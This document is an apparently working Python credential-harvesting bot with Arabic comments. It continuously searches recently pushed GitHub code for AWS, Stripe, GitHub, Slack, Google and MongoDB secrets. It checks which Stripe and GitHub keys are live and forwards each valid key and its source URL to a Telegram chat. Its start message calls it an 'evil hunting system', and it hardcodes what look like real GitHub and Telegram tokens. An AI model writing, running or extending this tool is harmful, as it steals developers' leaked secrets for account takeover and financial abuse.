import sys
import re
import time
import random
import requests
from datetime import datetime, timedelta

# =================================================================
# التوكنات المضمنة
# =================================================================
PAT_TOKEN = "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"
TELEGRAM_TOKEN = "8914882875:AAGmoUu_Ckl16HA0wrcM6YICNz1ZH_WphCQ"
TELEGRAM_CHAT_ID = "6306556778"
# =================================================================

# أنماط البحث
PATTERNS = {
    'aws': r'(AKIA|ASIA)[A-Z0-9]{16}',
    'stripe_live': r'sk_live_[A-Za-z0-9]{24}',
    'github_token': r'ghp_[A-Za-z0-9]{36}',
    'slack_token': r'xox[baprs]-[A-Za-z0-9]{10,48}',
    'google_api': r'AIza[0-9A-Za-z-_]{35}',
    'mongodb_uri': r'mongodb\+srv://[^:]+:[^@]+@[^/]+',
}

# ------------------- دوال التحقق -------------------
def validate_aws(key):
    try:
        if len(key) >= 16 and key.startswith(('AKIA', 'ASIA')):
            return True
        return False
    except:
        return False

def validate_stripe(key):
    try:
        resp = requests.get(
            'https://api.stripe.com/v1/balance',
            headers={'Authorization': f'Bearer {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_github(key):
    try:
        resp = requests.get(
            'https://api.github.com/user',
            headers={'Authorization': f'token {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_generic(key):
    return True

VALIDATORS = {
    'aws': validate_aws,
    'stripe_live': validate_stripe,
    'github_token': validate_github,
}

# ------------------- البحث في GitHub -------------------
def search_github(query, token):
    headers = {
        'Authorization': f'token {token}',
        'Accept': 'application/vnd.github.v3+json'
    }
    time_filter = (datetime.utcnow() - timedelta(hours=1)).isoformat() + 'Z'
    url = f"https://api.github.com/search/code?q={query}+pushed:>{time_filter}&per_page=30"
    try:
        resp = requests.get(url, headers=headers, timeout=20)
        if resp.status_code == 200:
            return resp.json().get('items', [])
        else:
            return []
    except Exception as e:
        print(f"Network Error: {e}")
        return []

# ------------------- الإرسال إلى تليجرام -------------------
def send_to_telegram(bot_token, chat_id, text, parse_mode='Markdown'):
    try:
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        requests.post(url, json=payload, timeout=10)
        return True
    except Exception as e:
        print(f"Telegram Error: {e}")
        return False

def send_key(bot_token, chat_id, key_type, key_value, raw_url):
    msg = (
        f"🔑 *{key_type.upper()}*\n"
        f"`{key_value}`\n"
        f"📁 {raw_url}\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"
    )
    send_to_telegram(bot_token, chat_id, msg)

def send_heartbeat(bot_token, chat_id, count):
    msg = (
        f"💓 *النظام يعمل ويبحث* 💓\n"
        f"⏳ الوقت: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n"
        f"🔄 عدد دورات الصيد المنفذة: {count}\n"
        f"👁️ مراقبة نشطة ... أنتظر أوامرك."
    )
    send_to_telegram(bot_token, chat_id, msg)

# ------------------- دورة البحث الرئيسية -------------------
def search_cycle(token, bot_token, chat_id):
    """تنفذ دورة بحث واحدة عن جميع الأنماط وترسل النتائج"""
    found_any = False
    for name, pattern in PATTERNS.items():
        results = search_github(f'"{pattern}"', token)
        print(f"[*] فحص {name}: {len(results)} ملف")
        for item in results:
            raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            if not raw_url:
                continue
            try:
                resp = requests.get(raw_url, timeout=15)
                if resp.status_code != 200:
                    continue
                matches = re.findall(pattern, resp.text)
                for m in set(matches):
                    valid = True
                    if name in VALIDATORS:
                        valid = VALIDATORS[name](m)
                    if valid:
                        send_key(bot_token, chat_id, name, m, raw_url)
                        found_any = True
                    time.sleep(random.uniform(1.0, 2.5))
            except Exception as e:
                print(f"[-] خطأ: {e}")
            time.sleep(random.uniform(0.3, 0.8))
    return found_any

# ------------------- التشغيل الدائم (الحلقة اللانهائية) -------------------
def main():
    token = PAT_TOKEN
    bot_token = TELEGRAM_TOKEN
    chat_id = TELEGRAM_CHAT_ID

    if not token or not bot_token or not chat_id:
        print("ERROR: تأكد من التوكنات")
        sys.exit(1)

    # رسالة بدء التشغيل (مرة واحدة فقط)
    start_msg = (
        f"🔥 *تم تشغيل نظام الصيد الشرير* 🔥\n"
        f"✅ سأرسل لك نبضات قلب كل 5 دقائق.\n"
        f"✅ سأرسل أي مفتاح صالح فور العثور عليه.\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(bot_token, chat_id, start_msg)
    print("[+] تم إرسال رسالة بدء التشغيل.")

    cycle_count = 0
    last_heartbeat = time.time()

    # الحلقة اللانهائية (ستعمل حتى توقفها GitHub بعد 6 ساعات)
    while True:
        try:
            # 1. تنفيذ دورة البحث
            print(f"[*] بدء الدورة رقم {cycle_count + 1}")
            search_cycle(token, bot_token, chat_id)
            cycle_count += 1

            # 2. انتظر 5 دقائق قبل الدورة التالية
            print("[*] انتظار 5 دقائق قبل الدورة التالية...")
            wait_time = 300  # 5 دقائق

            # نرسل نبضات قلب كل 5 دقائق أثناء الانتظار
            start_wait = time.time()
            while time.time() - start_wait < wait_time:
                time.sleep(10)  # نتحقق كل 10 ثوانٍ
                if time.time() - last_heartbeat >= 300:  # مرت 5 دقائق
                    send_heartbeat(bot_token, chat_id, cycle_count)
                    last_heartbeat = time.time()

            # نبض إضافي بعد انتهاء الانتظار مباشرة
            send_heartbeat(bot_token, chat_id, cycle_count)
            last_heartbeat = time.time()

        except Exception as e:
            # لو حصل خطأ غير متوقع، نرسل رسالة خطأ ونستمر
            error_msg = f"⚠️ *خطأ غير متوقع*: {str(e)[:100]}\nسيتم إعادة المحاولة..."
            send_to_telegram(bot_token, chat_id, error_msg)
            time.sleep(60)

if __name__ == "__main__":
    main()
